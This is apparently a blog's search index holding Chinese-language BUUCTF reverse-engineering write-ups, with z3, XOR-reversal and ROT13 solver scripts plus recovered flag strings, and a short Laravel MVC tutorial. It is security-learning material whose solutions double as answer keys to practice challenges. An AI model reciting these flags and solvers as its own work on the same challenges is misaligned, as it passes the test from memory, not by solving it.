<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuctf-reverse1</title>
      <link href="2021/04/16/buuctf-reverse1/"/>
      <url>2021/04/16/buuctf-reverse1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-羊城杯-2020-login"><a href="#1-羊城杯-2020-login" class="headerlink" title="1.[羊城杯 2020]login"></a>1.[羊城杯 2020]login</h2><ul><li>tips:<ul><li>解包pyinstaller打包的exe文件为源码</li><li>z3约束器</li><li>根据字串循环向后异或后的结果复原原文</li></ul></li></ul><p>先放入exeinfope中发现是pyinstaller打包成的exe文件<br>使用pyinstxtractor来unpack<br><a href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py">https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py</a><br><img src="https://i.loli.net/2021/04/17/A4DXl3M6mfGPH8Y.png" alt=""></p><p>打开文件夹中的同名文件，使用010editor打开补上pyc的头部，改后缀为pyc，然后使用uncompyle6来恢复成py源文件</p><p><img src="https://i.loli.net/2021/04/17/rSb4yNE8JInYVm1.png" alt=""></p><p>是个解方程组的问题<br>z3一把梭<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><p>然后涉及到的加密算法，自己在平板上演算了一遍，直接从尾到头异或回去就可以了<br><img src="https://i.loli.net/2021/04/17/yHJA2cVlbgSPoXn.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">24</span></span><br><span class="line">a13 = <span class="number">88</span></span><br><span class="line">a6 = <span class="number">43</span></span><br><span class="line">a9 = <span class="number">52</span></span><br><span class="line">a5 = <span class="number">104</span></span><br><span class="line">a12 = <span class="number">74</span></span><br><span class="line">a7 = <span class="number">28</span></span><br><span class="line">a1 = <span class="number">119</span></span><br><span class="line">a10 = <span class="number">108</span></span><br><span class="line">a11 = <span class="number">88</span></span><br><span class="line">a8 = <span class="number">91</span></span><br><span class="line">a4 = <span class="number">7</span></span><br><span class="line">a3 = <span class="number">10</span></span><br><span class="line">a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">code = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">code[<span class="number">2</span>] = a1 </span><br><span class="line">code[<span class="number">1</span>] = a2 </span><br><span class="line">code[<span class="number">0</span>] = a3 </span><br><span class="line">code[<span class="number">3</span>] = a4 </span><br><span class="line">code[<span class="number">4</span>] = a5 </span><br><span class="line">code[<span class="number">5</span>] = a6 </span><br><span class="line">code[<span class="number">6</span>] = a7 </span><br><span class="line">code[<span class="number">7</span>] = a8 </span><br><span class="line">code[<span class="number">9</span>] = a9 </span><br><span class="line">code[<span class="number">8</span>] = a10</span><br><span class="line">code[<span class="number">10</span>] = a11</span><br><span class="line">code[<span class="number">11</span>] = a12</span><br><span class="line">code[<span class="number">12</span>] = a13</span><br><span class="line">code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    code[i-<span class="number">1</span>] = code[i] ^ code[i-<span class="number">1</span>]</span><br><span class="line">    flag.append(code[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag.reverse()</span><br><span class="line">flag.append(code[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel框架学习</title>
      <link href="2021/04/14/Laravel-study/"/>
      <url>2021/04/14/Laravel-study/</url>
      
        <content type="html"><![CDATA[<h2 id="了解框架的MVC模型"><a href="#了解框架的MVC模型" class="headerlink" title="了解框架的MVC模型"></a>了解框架的MVC模型</h2><ul><li>使用框架来实现一个通过url访问用户邮箱的小功能来了解路由，模型和视图的写法</li></ul><p>首先在数据库中插入两条数据<br><img src="https://i.loli.net/2021/04/14/E3uoIHbUyxszrYO.png" alt=""></p><p>使用php artisan生成模型<br><img src="https://i.loli.net/2021/04/14/xiutPL4GvrRQ5nc.png" alt=""></p><p>通过文档得知命名规范如下</p><blockquote><p>数据表名称<br>请注意，我们并没有告诉 Eloquent 我们的 Flight 模型使用哪个数据表。 除非明确地指定了其它名称，否则将使用类的复数形式「蛇形命名」来作为表名。因此，在这种情况下，Eloquent 将假设 Flight 模型存储的是 flights 数据表中的数据，而 AirTrafficController 模型会将记录存储在 air_traffic_controllers 表中。<br>你可以通过在模型上定义 table 属性来指定自定义数据表：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 与模型关联的表名</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;my_flights&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p>所以我们使用的数据表为usertests,模型为Usertest</p><blockquote><p>默认情况下，Eloquent 预期你的数据表中存在 created_at 和 updated_at 两个字段 。如果你不想让 Eloquent 自动管理这两个列， 请将模型中的 $timestamps 属性设置为 false：</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否主动维护时间戳</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Usertest-php模型代码"><a href="#Usertest-php模型代码" class="headerlink" title="Usertest.php模型代码"></a>Usertest.php模型代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Factories</span>\<span class="title">HasFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Usertest</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HasFactory</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PostTestController-php控制器代码"><a href="#PostTestController-php控制器代码" class="headerlink" title="PostTestController.php控制器代码"></a>PostTestController.php控制器代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">laravel_study_user</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Usertest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostTestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dbuser</span> = Usertest::query() -&gt; where(<span class="string">&quot;username&quot;</span>,<span class="variable">$user</span>) -&gt; firstOrFail();</span><br><span class="line">        <span class="comment">// dd调试php程序</span></span><br><span class="line">        <span class="comment">//        dd($dbuser);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改了alex用户的email</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;email = &quot;alex.com&quot;;</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;save();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// return视图</span></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&quot;posttest&quot;</span>,[<span class="string">&quot;user&quot;</span>=&gt;<span class="variable">$user</span>,<span class="string">&quot;email&quot;</span>=&gt;<span class="variable">$dbuser</span>-&gt;email]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web-php路由代码"><a href="#web-php路由代码" class="headerlink" title="web.php路由代码"></a>web.php路由代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the &quot;web&quot; middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;posttest/&#123;user&#125;&#x27;</span>,[\App\Http\Controllers\PostTestController::class,<span class="string">&quot;show&quot;</span>]);</span><br></pre></td></tr></table></figure><h3 id="posttest-blade-php视图代码"><a href="#posttest-blade-php视图代码" class="headerlink" title="posttest.blade.php视图代码"></a>posttest.blade.php视图代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello laravel&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; &#123;&#123; <span class="variable">$user</span> &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; <span class="variable">$email</span> &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://i.loli.net/2021/04/14/yceTw72BnEvJ3QU.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 开发学习 </tag>
            
            <tag> 开发框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf reverse题解1</title>
      <link href="2021/04/07/buuctf-reverse/"/>
      <url>2021/04/07/buuctf-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="1-GXYCTF2019-luck-guy"><a href="#1-GXYCTF2019-luck-guy" class="headerlink" title="1.[GXYCTF2019]luck_guy"></a>1.[GXYCTF2019]luck_guy</h2><p>elf文件，64位，目测是输入什么lucky number<br><img src="https://i.loli.net/2021/04/07/Fjytlk8xvTOhY3f.png" alt=""></p><p>不管他，直接ida f5大法<br>主要的函数就是getflag这个函数<br><img src="https://i.loli.net/2021/04/07/6VtlXNYGDeALmrq.png" alt=""><br>设置了随机数，然后switch，本地测试基本不可能走1-5分支<br>目测一下，比较合理的流程就是451<br>4为f2赋值<br>5改f2的值<br>1拼接f1和f2<br>其中f1在data段，有字符串数据，f2在bss未初始化全局变量段<br>然后就走这个流程，一开始脑子抽了，指针那个地方读错了然后就怎么也找不到<br>结合汇编来读，局部变量s其实不是一个long long类型的数据而是一个字符数组</p><p><img src="https://i.loli.net/2021/04/07/vPWqsT9XVmuxpJl.png" alt=""></p><p>然后本地写个脚本一运行就出来了<br>附上本地调试的py脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;7F666F6067756369&quot;</span></span><br><span class="line"></span><br><span class="line">listFlag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        listFlag.append(flag[i-<span class="number">2</span>:i])</span><br><span class="line"></span><br><span class="line">listFlag.append(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line">listFlag.reverse()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="string">&#x27;0x&#x27;</span> + listFlag[i]</span><br><span class="line">    <span class="comment"># listFlag[i] = int(listFlag[i],16)</span></span><br><span class="line"><span class="comment"># print(listFlag)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">int</span>(listFlag[i],base = <span class="number">16</span>)</span><br><span class="line">    print(listFlag)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">chr</span>(listFlag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(listFlag))</span><br></pre></td></tr></table></figure><p>最后得到flag，但是是GXY前缀，换上ctf前缀交上才对<br><code>flag&#123;&#123;do_not_hate_me&#125;</code></p><h2 id="2-BJDCTF2020-JustRE"><a href="#2-BJDCTF2020-JustRE" class="headerlink" title="2.[BJDCTF2020]JustRE"></a>2.[BJDCTF2020]JustRE</h2><p>签到题</p><p>感觉像个win32的小程序<br><img src="https://i.loli.net/2021/04/08/uRZEXSd3ThVbU5q.png" alt=""></p><p>搜字符串大法<br><img src="https://i.loli.net/2021/04/08/7FwZ6BTmgpWUM5z.png" alt=""></p><p>发现格式化字符串<br><img src="https://i.loli.net/2021/04/08/Y6zUuAHxFZedtk9.png" alt=""></p><p>交上就对了555</p><h2 id="3-FlareOn4-login"><a href="#3-FlareOn4-login" class="headerlink" title="3.[FlareOn4]login"></a>3.[FlareOn4]login</h2><p>下载下来发现是html文件<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>)     ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>发现一段js代码<br>分析发现核心逻辑主要是这一句，只要是字母就被正则匹配到，然后执行下面这个<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13)     ? c : c - 26);&#125;);</code><br>大概就是判断字符是否小于Z，如果是第一个括号的值就变成Z否则变成z(注意此时c的值没有发生改变)，然后第二个小括号是将c本身+13(注意此时c的值已经发生了改变)<br>再判断两个值的大小关系，如果前者大就不改变，如果后者大就-26(即相当于+13后-26，本质是原本的字符-13)<br>字母一共26个，如果本身变成z后大于本身+13，那么字母一定会小于n</p><p>有了这个逻辑写解密脚本就可以了，遍历加密后的字符串，如果当前字符属于a-m，那么+13，如果属于n-z，那么-13即可<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line">flaglist = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;M&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &lt;= <span class="string">&#x27;m&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) - <span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></p><p><code>flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;</code></p><p>看了别的师傅的wp才发现这是一种加密为ROT13加密，学到了</p><blockquote><p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开 头即可。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符 号、空白字元以及所有其他字元都不变。因为只有在英文字母表里头只有26个，并且26=2×13，ROT13函数是它自己的逆反： [1] </p></blockquote><p>对任何字元x：ROT13(ROT13(x))=ROT26(x)=x。<br>直接找个在线解密工具梭出来也可以</p><h2 id="4-GUET-CTF2019-re"><a href="#4-GUET-CTF2019-re" class="headerlink" title="4.[GUET-CTF2019]re"></a>4.[GUET-CTF2019]re</h2><p>是个ELF文件，先checksec一下<br><img src="https://i.loli.net/2021/04/10/oJTznurCURtXE5N.png" alt=""><br>发现存在UPX壳<br>直接用工具脱壳<br><code>./upx -d ./re</code><br>然后进入ida分析，核心逻辑很简单，求出每一位flag然后转换成字符就可以，但是有坑点<br><img src="https://i.loli.net/2021/04/10/6rUJXYEoli1egf5.png" alt=""></p><p>一开始是想逐步求解的，但是发现这也太反人类了，直接用正则提取吧<br>脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"><span class="number">166163712</span>//<span class="number">1629056</span></span><br><span class="line">,<span class="number">731332800</span>//<span 